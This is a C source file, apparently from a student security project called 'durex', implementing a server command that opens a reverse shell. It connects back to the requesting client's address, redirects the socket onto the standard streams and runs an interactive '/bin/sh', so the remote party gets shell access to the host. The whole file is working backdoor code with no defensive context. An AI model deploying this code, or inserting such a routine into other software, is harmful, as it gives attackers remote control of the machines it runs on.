/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   server_remote_shell.c                              :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: gbourgeo <gbourgeo@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/08/05 00:00:37 by gbourgeo          #+#    #+#             */
/*   Updated: 2019/08/05 00:05:29 by gbourgeo         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

/* getrlimit */
#include <sys/time.h>
#include <sys/resource.h>
/* exit */
#include <stdlib.h>

#include "durex.h"

void				serverRemoteShell(t_cl *client, t_cmd *cmds)
{
	char			**options;
	char			*port;
	int				fd;
	pid_t			pid;

	serverLog(1, "[CMDS] - %d: Reverse shell wanted.\n", client->id);
	options = mysplitwhitespaces(cmds->opt);
	port = (options && options[1]) ? options[1] : SERVER_REMOTE_PORT;
	fd = serverConnectShell(client, port);
	mytabdel(&options);
	if (fd >= 0) {
		pid = fork();
		if (pid == 0) {
			serverLog(1, "[CMDS] - %d: Spawning reverse shell on %s:%s\n", client->id, client->addr, port);
			clientWrite("Spawning reverse shell...\n", client);
			struct rlimit	rlim;

			if (getrlimit(RLIMIT_NOFILE, &rlim) || rlim.rlim_max == RLIM_INFINITY)
				rlim.rlim_max = 4096;
			for (size_t i = 0; i < rlim.rlim_max; i++) {
				if (i != (size_t)fd)
					close(i);
			}
			dup(fd);
			dup(fd);
			dup(fd);
			close(fd);
			{
				char *cmd[] = { "/bin/sh", "-i", NULL };
				execvp(cmd[0], cmd);
			}
			exit(0);
		} else if (pid > 0) {
			serverQuitClient(client, cmds);
		} else {
			serverLog(1, "[ERRO] - %d: Failed to fork a new reverse shell.\n", client->id);
			clientWrite("Fork failed.\n", client);
		}
		close(fd);
	} else {
		clientWrite("$> ", client);
	}
}
